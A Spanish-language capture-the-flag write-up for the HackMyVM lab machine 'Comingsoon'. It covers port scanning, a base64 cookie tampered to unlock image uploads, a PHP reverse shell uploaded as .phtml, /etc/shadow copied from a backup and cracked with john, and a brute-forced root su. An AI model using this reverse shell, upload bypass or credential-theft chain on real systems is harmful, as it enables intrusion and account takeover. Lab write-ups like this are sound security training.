---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Comingsoon HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-16 02:57 EDT
Nmap scan report for 192.168.5.18
Host is up (0.00053s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 bc:fb:ec:b8:93:d4:e2:78:76:eb:1b:dc:4b:a7:7f:9b (RSA)
|   256 31:41:a0:d7:e9:3c:79:11:c2:f0:81:a0:fe:2d:f9:b0 (ECDSA)
|_  256 c9:34:17:00:31:75:4d:c0:3a:a5:b1:16:36:0d:bb:18 (ED25519)
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
|_http-title: Bolt - Coming Soon Template
|_http-server-header: Apache/2.4.51 (Debian)
MAC Address: 08:00:27:71:32:88 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds
```

Veremos un puerto `80` en el que tiene alojado una pagina web, si entramos a dicha pagina web veremos que hay un contador de que la pagina se estrenara en `15` dias, por lo que vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.18/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 3988]
/.php                 (Status: 403) [Size: 277]
/assets               (Status: 200) [Size: 1495]
/license.txt          (Status: 200) [Size: 528]
/notes.txt            (Status: 200) [Size: 279]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 513033 / 882244 (58.15%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 513064 / 882244 (58.15%)
===============================================================
Finished
===============================================================
```

Vemos varias cosas interesante, vamos a ver que contiene `notes.txt` y `license.txt`.

> notes.txt

```
Dave,

Last few jobs to do...

Set ssh to use keys only (passphrase same as the password)

Just need to sort the images out:
resize and scp them or using the built-in image uploader.

Test the backups and delete anything not needed.

Apply an https certificate.

Cheers,

Webdev
```

> license.txt

```
Thanks for using the free version of Bolt. Please, consider purchasing the full version of Bolt to Enjoy All Features and Freedom to Use in Commercial Projects.

LIMITATIONS OF FREE VERSION:

1. Commercial Use - Not Allowed
2. Removing Footer Credit - Not Allowed
3. All Features - Not Available
4. Documentation and Support - Not Provided
5. Royalty Free Images - Not Provided

To purchase commercial license please visit: https://uideck.com/products/bolt-free-coming-soon-template/ and choose commercial license.

Best regards
```

No veremos gran informacion, pero si entendemos que por detras la pagina tiene que tener un mecanismo de subir imagenes, ya que en `notes.txt` comentan que hay algo para subir imagenes, por lo que vamos a seguir investigando.

Vamos abrir `BurpSuite` y vamos a ver que esta sucediendo a nivel de peticion todo lo de la pagina principal.

Una vez que estemos a la escucha con `BurpSuite` y recarguemos la pagina principal, habremos capturado una peticion asi:

```
GET / HTTP/1.1
Host: 192.168.5.18
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: RW5hYmxlVXBsb2FkZXIK=ZmFsc2UK
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

Veremos una cosa interesante y es que tenemos establecida una `Cookie` que esta codificada, vamos a probar a decodificarla.

Si la decodificamos veremos `false` simplemente eso, vamos a inspeccionar la pagina y mirar que vemos en un comentario.

```html
<!-- Upload images link if EnableUploader set -->
```

Vemos que si activamos algo se nos habilita algo para subir imagenes, si `inspeccionamos` la pagina y nos vamos a la seccion `Storage` de ahi a `Cookies` veremos lo siguiente:

```
Name                    Value

RW5hYmxlVXBsb2FkZXIK    ZmFsc2UK
```

Vamos a decodificar todo esto:

```
Name                    Value

EnableUploader          false
```

Vemos que se esta refiriendo a la `Cookie` por lo que vamos a modificarla de esta forma, vamos a codificar en `Base64` la palabra `true` y veremos esto:

```
dHJ1ZQ==
```

Ahora en la seccion de `Cookie` vamos a modificar el `Value` y vamos a pegar ese fragmento modificado:

<figure><img src="../../.gitbook/assets/image (381).png" alt=""><figcaption></figcaption></figure>

Con esto estableceremos en `true` dicha `Cookie`, ahora si le damos a `ENTER` y vemos la pagina veremos el siguiente boton.

<figure><img src="../../.gitbook/assets/image (382).png" alt=""><figcaption></figcaption></figure>

Si le damos nos llevara a una seccion para poder subir un archivo, vamos a probar a subir un archivo `.php` con una `reverse shell`.

## Escalate user www-data

> webshell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Si intentamos subir dicho archivo veremos esto:

```
For security, .php files are allowed.Sorry, your file was not uploaded.
```

Vemos que lo esta securizando, por lo que vamos a probar extensiones de `PHP` pero para `bypassearlo`.

<figure><img src="../../.gitbook/assets/image (383).png" alt=""><figcaption></figcaption></figure>

Vamos a probar con `.phtml`.

```shell
mv webshell.php webshell.phtml
```

Ahora vamos a probar a subirlo de nuevo a ver si nos deja.

Veremos que con esto si que nos dejara y nos llevara de forma automatica a `/assets/img/` donde estara el archivo subido.

Antes de entrar en dicho archivo, vamos a ponernos a la escucha.

```shell
nc -lvnp <PORT>
```

Ahora si entramos en el archivo que esta subida a la `web` y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.4] from (UNKNOWN) [192.168.5.18] 52218
whoami
www-data
```

Vemos que ha funcionado, por lo que sanitizaremos la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user scpuser

Si listamos la siguiente ruta veremos lo siguiente:

```shell
ls -la /var/backups/
```

Info:

```
total 2024
drwxr-xr-x  2 root root    4096 May 16 08:15 .
drwxr-xr-x 12 root root    4096 Dec 15  2021 ..
-rw-r--r--  1 root root   30720 Dec 15  2021 alternatives.tar.0
-rw-r--r--  1 root root    9128 Dec 15  2021 apt.extended_states.0
-rw-r--r--  1 root root     990 Dec 15  2021 apt.extended_states.1.gz
-rw-r--r--  1 root root 1541366 May 16 08:15 backup.tar.gz
-rw-r--r--  1 root root       0 Dec 16  2021 dpkg.arch.0
-rw-r--r--  1 root root      32 Dec 15  2021 dpkg.arch.1.gz
-rw-r--r--  1 root root     186 Dec 15  2021 dpkg.diversions.0
-rw-r--r--  1 root root     126 Dec 15  2021 dpkg.diversions.1.gz
-rw-r--r--  1 root root     172 Dec 15  2021 dpkg.statoverride.0
-rw-r--r--  1 root root     120 Dec 15  2021 dpkg.statoverride.1.gz
-rw-r--r--  1 root root  354260 Dec 15  2021 dpkg.status.0
-rw-r--r--  1 root root   90231 Dec 15  2021 dpkg.status.1.gz
```

Vemos cosas interesantes, pero entre ellas el siguiente archivo:

```
backup.tar.gz
```

Ese archivo no suele estar por defecto, por lo que vamos a copiarnoslo a la carpeta `/tmp` y vamos a descomprimirlo a ver que tiene.

```shell
cd /var/backups/
cp backup.tar.gz /tmp/
cd /tmp
tar -xvzf backup.tar.gz
```

Info:

```
var/www/
var/www/html/
var/www/html/index.php
var/www/html/5df03f95b4ff4f4b5dabe53a5a1e15d7.php
var/www/html/assets/
var/www/html/assets/css/
var/www/html/assets/css/.DS_Store
var/www/html/assets/css/main.css
var/www/html/assets/css/slicknav.css
var/www/html/assets/css/responsive.css
var/www/html/assets/css/bootstrap.min.css
var/www/html/assets/css/animate.css
var/www/html/assets/css/menu_sideslide.css
var/www/html/assets/css/vegas.min.css
var/www/html/assets/.DS_Store
var/www/html/assets/fonts/
var/www/html/assets/fonts/LineIcons.woff
var/www/html/assets/fonts/.DS_Store
var/www/html/assets/fonts/LineIcons.eot
var/www/html/assets/fonts/LineIcons.svg
var/www/html/assets/fonts/line-icons.css
var/www/html/assets/fonts/LineIcons.ttf
var/www/html/assets/img/
var/www/html/assets/img/map-marker.png
var/www/html/assets/img/logo.psd
var/www/html/assets/img/logo.png
var/www/html/assets/img/hero-area.jpg
var/www/html/assets/img/slide1.jpg
var/www/html/assets/img/slide2.jpg
var/www/html/assets/img/slide3.jpg
var/www/html/assets/js/
var/www/html/assets/js/contact-form-script.min.js
var/www/html/assets/js/form-validator.min.js
var/www/html/assets/js/jquery.slicknav.js
var/www/html/assets/js/.DS_Store
var/www/html/assets/js/jquery.nav.js
var/www/html/assets/js/classie.js
var/www/html/assets/js/popper.min.js
var/www/html/assets/js/scrolling-nav.js
var/www/html/assets/js/wow.js
var/www/html/assets/js/menu.js
var/www/html/assets/js/jquery.easing.min.js
var/www/html/assets/js/main.js
var/www/html/assets/js/jquery-min.js
var/www/html/assets/js/map.js
var/www/html/assets/js/bootstrap.min.js
var/www/html/assets/js/jquery.countdown.min.js
var/www/html/assets/js/vegas.min.js
var/www/html/license.txt
var/www/html/notes.txt
etc/passwd
etc/shadow
```

Vemos que nos ha descomprimido la `pagina` web en si y despues en la carpeta `/etc` vemos cosas interesantes, dos archivos y uno de ellos es el `shadow` por lo que vamos a pasarnoslo a la maquina `host` mediante un servidor de `python3`.

```shell
cd /tmp/etc
python3 -m http.server
```

Ahora desde la maquina `host` nos lo descargaremos con `wget`.

```shell
wget http://<IP_VICTIM>:8000/shadow
wget http://<IP_VICTIM>:8000/passwd
```

Una vez echo esto, vamos a intentar `crackear` las contraseñas que haya en el `shadow` con `john`.

> hash

```
scpuser:$y$j9T$rVt3bxjp6uYKKYJbYU2Zq0$Ysn02LrCwTUB7iQdRiROO7/WQi8JSGtwLZllR54iX0.:18976:0:99999:7:::
root:$y$j9T$/E0VUDL7uS9RsrvwmGcOH0$LEB/7ERUX9bkm646n3v3RJBxttSVWmTBvs2tUjKe9I6:18976:0:99999:7:::
```

```shell
john --format=crypt --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tigger           (scpuser)     
1g 0:00:00:22 0.04% (ETA: 17:55:44) 0.04494g/s 327.9p/s 332.2c/s 332.2C/s sheree..hotgurl
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

Veremos que ha funcionado, hemos encontrados las credenciales del usuario `scpuser`, por lo que vamos a escalar con dicho usuario.

```shell
su scpuser
```

Metemos como contraseña `tigger` y veremos que estaremos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
HMV{user:comingsoon.hmv:58842fc1a7}
```

## Escalate Privileges

Vemos que en la `/home` del propio usuario hay un archivo bastante interesante llamado `.oldpasswords` si lo leemos veremos lo siguiente:

```
Previous root passwords just incase they are needed for a backup\restore

Incredibles2
Paddington2
BigHero6
101Dalmations
```

Vemos lo que parecen contraseñas basadas en titulos de peliculas con los numeros pegados sin espacios, si probamos todas las contraseñas con el usuario `root` veremos que no funcionara, por lo que vamos a buscar en internet la misma tematica de contraseñas buscando `Las 100 mejores peliculas animadas` y veremos lo siguiente:

URL = [100 mejores peliculas animadas](https://www.filmaffinity.com/es/userlist.php?user_id=988980\&list_id=1116)

Vamos a coger las `5` primeras y vamos a crear un diccionario de ello poniendo los `5` primeros numeros a cada uno de ellos sin espacios quedando algo asi:

> dic.txt

```
Pinocho
Pinocho2
Pinocho3
Pinocho4
Pinocho5
ElviajedeChihiro
ElviajedeChihiro2
ElviajedeChihiro3
ElviajedeChihiro4
ElviajedeChihiro5
MivecinoTotoro
MivecinoTotoro2
MivecinoTotoro3
MivecinoTotoro4
MivecinoTotoro5
ToyStory
ToyStory2
ToyStory3
ToyStory4
ToyStory5
LosIncreibles
LosIncreibles2
LosIncreibles3
LosIncreibles4
LosIncreibles5
```

Ahora vamos a descargarnos un script para realizar `fuerza bruta` hacia el usuario `root`.

URL = [Download Linux-Su-Force.sh](https://github.com/Maalfer/Sudo_BruteForce/blob/main/Linux-Su-Force.sh)

Una vez que lo hayamos copiado y pegado en la carpeta `/tmp` de la maquina victima, lo ejecutaremos de la siguiente forma.

```shell
bash Linux-Su-Force.sh root dic.txt
```

Info:

```
Contraseña encontrada para el usuario root: ToyStory3
```

Vemos que hemos encontrado la contraseña, por lo que vamos a escalar a `root`.

```shell
su root
```

Metemos como contraseña `ToyStory3` y veremos que estamos dentro.

Info:

```
root@comingsoon:~# whoami
root
```

Por lo que vamos a leer la `flag` de `root`.

> root.txt

```
HMV{root:comingsoon.hmv:2339dc81ca}
```
